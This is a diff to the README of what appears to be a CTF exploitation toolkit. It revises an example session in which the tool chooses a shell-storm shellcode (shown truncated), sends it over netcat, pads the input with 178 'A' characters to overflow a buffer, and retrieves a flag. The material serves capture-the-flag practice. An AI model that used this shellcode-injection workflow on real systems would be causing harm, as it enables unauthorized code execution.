@@ -41,11 +41,14 @@ Port 4444: GIVE ME SHELLCODZ
 Selection: 86
 You chosed http://shell-storm.org/shellcode/files/shellcode-752.php
 Shellcode: "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62[...]"
->>> nc.write(shell_code)
-$ ls
-README.md  commit.sh  setup.py  v0lt  flag.txt
-$ cat flag.txt
-myCTF{3d1DD1C223DcfddDAe1D0faaD1BEEADdaabB2Ea0DeB023aCdebbABCCB01ccacf}
+>>> nc.writeln(shell_code, shellcode=True)
+>>> nc.writeln("A"*178)
+>>> exploit = nc.dialogue("cat flag", 3)
+>>> print(exploit)
+File name too long
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAflag{EasyPe4syL3m0nSq33zy}!!
 ```
 ##Implemented:    
 * Crypto    
@@ -64,4 +67,4 @@ myCTF{3d1DD1C223DcfddDAe1D0faaD1BEEADdaabB2Ea0DeB023aCdebbABCCB01ccacf}
     * Netcat    
     * Telnet    
 
-And more !
+And more
